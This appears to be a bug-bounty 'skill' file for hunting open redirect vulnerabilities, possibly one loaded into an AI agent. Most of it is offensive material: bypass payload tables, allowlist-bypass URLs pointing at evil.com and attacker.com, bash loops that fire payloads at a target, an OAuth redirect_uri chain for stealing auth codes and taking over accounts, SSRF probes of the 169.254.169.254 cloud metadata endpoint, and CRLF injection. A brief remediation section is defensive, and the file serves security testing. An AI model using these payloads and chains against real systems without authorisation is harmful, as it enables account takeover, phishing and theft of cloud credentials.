---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection, URL-parser-differential allowlist bypass. Use when hunting redirect bugs or building ATO chains.
sources: hackerone_public, portswigger_research, public_research
report_count: 28
cwe: [CWE-601, CWE-610]
cvss_baseline: "Low (3.1-4.3) standalone redirect → High (7.1-8.1) chained to OAuth code/token theft or server-side SSRF → the value is almost always in the chain, not the redirect itself."
related_skills: [hunt-oauth, hunt-ssrf, hunt-ato, hunt-dom, hunt-host-header]
---

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## New Techniques (2024-2026)

### URL-parser-differential allowlist bypass
When the app allowlists the redirect host, the bug is usually that the *validator* and the *browser* (or a server-side fetcher) parse the URL differently. Modern payloads target that gap:
```
https://attacker.com\@target.com            # backslash: validator sees host=target.com, browser sees attacker.com
https://target.com%2523@attacker.com        # double-encoded fragment/userinfo confusion
https://target.com%2f%2f@attacker.com
https://attacker.com%3F.target.com           # encoded ? makes rest a query to the browser
https://attacker.com%E3%80%82target%E3%80%82com   # ideographic full-stop (。) normalized to "." → attacker.com
https://target。com@attacker.com              # unicode-dot host confusion
//attacker.com/%2e%2e                         # scheme-relative + traversal
/\/\attacker.com                              # multiple slash/backslash mixes
https://target.com.attacker.com               # suffix-match allowlist bug ("startsWith target.com")
https://attacker.com#@target.com / ?@target.com
```
Also test allowlist logic directly: `startsWith("target.com")`, `contains("target.com")`, and unanchored regex (`target\.com` without `^...$`) each break on one of the above.

### `redirect_uri` allowlist bypass in OAuth (the money chain)
- **Path append / traversal:** registered `https://target.com/callback` but server does prefix match → `…/callback/../redirect?url=//attacker` or `…/callback/..%2f`.
- **Subdomain/sibling:** `redirect_uri=https://attacker-controlled.target.com/...` when any subdomain is allowed.
- **Fragment/trailing abuse:** append `#` or extra params the matcher ignores but the browser honors.
Full mechanics in `hunt-oauth`; this skill provides the redirect primitive the OAuth chain consumes.

### Request-smuggling / header-injection redirect
CRLF into a redirect param (`?next=%0d%0aLocation:%20//attacker`) → response-splitting redirect; cross-ref `hunt-host-header` and `hunt-http-smuggling`.

## Remediation

- Don't reflect user input into redirects. Prefer server-side mapping (token → fixed URL) over free-form `?next=`.
- If a URL must be accepted, allowlist by **exact host match on a correctly-parsed URL** (parse, then compare the host component — never `startsWith`/`contains`/substring), and allow only `https` + relative paths.
- Default to relative-path-only redirects; reject absolute URLs, scheme-relative (`//`), and non-http schemes (`javascript:`, `data:`).
- For OAuth, exact-match registered `redirect_uri` (full string, no prefix/subpath matching).

## Validation

✅ Location header (or JS navigation / meta-refresh) sends the browser to evil.com (your controlled domain)
✅ Browser actually lands on the attacker-controlled page (confirm DOM-based ones in a real browser, not curl)
✅ For chains, demonstrate the consumed artifact (OAuth `code`/token delivered to attacker, or SSRF content)

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## Disclosed Report Patterns

Verify before quoting IDs/amounts.
- **Open redirect on a trusted domain → OAuth `redirect_uri` chain → auth-code theft → ATO** — the canonical high-value open-redirect disclosure shape.
- **Allowlist suffix/substring bypass** (`target.com.attacker.com`, backslash/`@` confusion) — recurring low→medium that becomes the OAuth chain's enabler.
- **DOM-based open redirect** from `location.hash`/`search` into `location.href` — PortSwigger-documented, common in SPAs.
